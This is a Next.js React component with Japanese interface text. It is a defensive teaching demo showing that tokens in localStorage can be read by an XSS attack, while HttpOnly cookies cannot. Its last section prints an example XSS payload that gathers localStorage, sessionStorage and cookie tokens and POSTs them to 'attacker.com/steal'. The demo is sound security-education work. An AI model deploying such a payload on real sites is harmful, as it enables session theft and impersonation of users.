'use client';

import { useState, useEffect } from 'react';

export default function XSSDemo() {
  const [setupDone, setSetupDone] = useState(false);
  const [localStorageResult, setLocalStorageResult] = useState<string>('');
  const [cookieResult, setCookieResult] = useState<string>('');
  
  // モックトークン
  const mockToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI1MDdmMWY3N2JjZjg2Y2Q3OTk0MzkwMTEiLCJpYXQiOjE2OTUwMjQwMDAsImV4cCI6MTY5NTExMDQwMH0.mock_signature_for_demo';
  
  function setupTokens() {
    // LocalStorageにトークンを保存
    localStorage.setItem('accessToken', mockToken);
    localStorage.setItem('refreshToken', mockToken + '_refresh');
    
    // 通常のCookie（JavaScriptからアクセス可能）
    document.cookie = `normalToken=${mockToken}; path=/`;
    
    setSetupDone(true);
  }
  
  function clearTokens() {
    localStorage.removeItem('accessToken');
    localStorage.removeItem('refreshToken');
    document.cookie = 'normalToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
    
    setSetupDone(false);
    setLocalStorageResult('');
    setCookieResult('');
  }
  
  function simulateXSSLocalStorage() {
    // XSS攻撃シミュレーション
    const stolenData = {
      localStorage: {
        accessToken: localStorage.getItem('accessToken'),
        refreshToken: localStorage.getItem('refreshToken')
      },
      sessionStorage: {
        accessToken: sessionStorage.getItem('accessToken')
      },
      allLocalStorageKeys: Object.keys(localStorage)
    };
    
    if (stolenData.localStorage.accessToken) {
      setLocalStorageResult(`
⚠️ トークンが盗まれました！

盗まれたデータ:
${JSON.stringify(stolenData, null, 2)}

攻撃者はこのトークンを使用して、ユーザーになりすますことができます。
      `);
    } else {
      setLocalStorageResult('📝 LocalStorageにトークンが見つかりません。先に「トークンを設定」をクリックしてください。');
    }
  }
  
  function simulateXSSCookie() {
    // Cookie取得を試みる
    const allCookies = document.cookie;
    const cookieObj: Record<string, string> = {};
    
    allCookies.split(';').forEach(cookie => {
      const [name, value] = cookie.trim().split('=');
      if (name) cookieObj[name] = value;
    });
    
    setCookieResult(`
✅ HttpOnly Cookieは保護されています！

JavaScriptから見えるCookie:
${JSON.stringify(cookieObj, null, 2)}

注意: HttpOnly属性が設定されたCookie（userAccessToken、userRefreshTokenなど）は表示されません。
💡 HttpOnly Cookieはブラウザが自動的にリクエストに含めますが、JavaScriptからは読み取れません。
    `);
  }
  
  useEffect(() => {
    console.log('🔍 現在の認証情報:');
    console.log('LocalStorage:', localStorage.getItem('accessToken') ? '存在' : 'なし');
    console.log('Cookies:', document.cookie || 'なし');
  }, []);

  return (
    <div className="min-h-screen bg-gray-50 py-8">
      <div className="max-w-4xl mx-auto px-4">
        <h1 className="text-3xl font-bold text-gray-900 mb-8">🛡️ XSS保護デモンストレーション</h1>

        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-8">
          <p className="text-blue-800">
            <strong>📌 このページについて:</strong><br />
            LocalStorage方式とHttpOnly Cookie方式のセキュリティの違いを実際に体験できます。
          </p>
        </div>

        {/* 1. テスト用トークンの設定 */}
        <div className="bg-white rounded-lg shadow-md p-6 mb-6">
          <h2 className="text-xl font-semibold mb-4">1. テスト用トークンの設定</h2>
          <p className="text-gray-600 mb-4">まず、テスト用のトークンを設定します。</p>
          
          <div className="flex gap-4 mb-4">
            <button
              onClick={setupTokens}
              className="bg-purple-600 text-white px-4 py-2 rounded-lg hover:bg-purple-700"
            >
              トークンを設定
            </button>
            <button
              onClick={clearTokens}
              className="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700"
            >
              トークンをクリア
            </button>
          </div>
          
          {setupDone && (
            <div className="bg-green-50 border border-green-200 rounded-lg p-4">
              <p className="text-green-800">✅ トークンを設定しました！</p>
              <pre className="mt-2 text-sm bg-gray-100 p-2 rounded overflow-x-auto">
                {`LocalStorage:
accessToken: ${mockToken.substring(0, 30)}...
refreshToken: ${(mockToken + '_refresh').substring(0, 30)}...

通常のCookie:
normalToken: ${mockToken.substring(0, 30)}...

HttpOnly Cookie:
（サーバー側でのみ設定可能）`}
              </pre>
            </div>
          )}
        </div>

        {/* 2. LocalStorage方式のテスト */}
        <div className="bg-white rounded-lg shadow-md p-6 mb-6">
          <h2 className="text-xl font-semibold mb-4">2. LocalStorage方式のテスト（従来方式）</h2>
          <p className="text-gray-600 mb-4">XSS攻撃をシミュレートして、LocalStorageからトークンを取得します。</p>
          
          <button
            onClick={simulateXSSLocalStorage}
            className="bg-orange-600 text-white px-4 py-2 rounded-lg hover:bg-orange-700 mb-4"
          >
            XSS攻撃をシミュレート
          </button>
          
          {localStorageResult && (
            <div className={`rounded-lg p-4 ${localStorageResult.includes('盗まれました') ? 'bg-red-50 border border-red-200' : 'bg-gray-50 border border-gray-200'}`}>
              <pre className="whitespace-pre-wrap text-sm">{localStorageResult}</pre>
            </div>
          )}
        </div>

        {/* 3. HttpOnly Cookie方式のテスト */}
        <div className="bg-white rounded-lg shadow-md p-6 mb-6">
          <h2 className="text-xl font-semibold mb-4">3. HttpOnly Cookie方式のテスト（新方式）</h2>
          <p className="text-gray-600 mb-4">同じXSS攻撃を試みますが、HttpOnly Cookieは読み取れません。</p>
          
          <button
            onClick={simulateXSSCookie}
            className="bg-green-600 text-white px-4 py-2 rounded-lg hover:bg-green-700 mb-4"
          >
            XSS攻撃をシミュレート
          </button>
          
          {cookieResult && (
            <div className="bg-green-50 border border-green-200 rounded-lg p-4">
              <pre className="whitespace-pre-wrap text-sm">{cookieResult}</pre>
            </div>
          )}
        </div>

        {/* 4. 実際のXSSペイロード例 */}
        <div className="bg-white rounded-lg shadow-md p-6">
          <h2 className="text-xl font-semibold mb-4">4. 実際のXSSペイロード例</h2>
          <p className="text-gray-600 mb-4">以下は実際のXSS攻撃で使用される可能性のあるコードです：</p>
          
          <pre className="bg-gray-100 p-4 rounded-lg overflow-x-auto text-sm">
{`<script>
// トークンを盗む悪意のあるコード
(function() {
    const tokens = {
        localStorage: localStorage.getItem('accessToken'),
        sessionStorage: sessionStorage.getItem('accessToken'),
        cookies: document.cookie
    };
    
    // 攻撃者のサーバーに送信
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(tokens)
    });
})();
</script>`}
          </pre>
        </div>
      </div>
    </div>
  );
}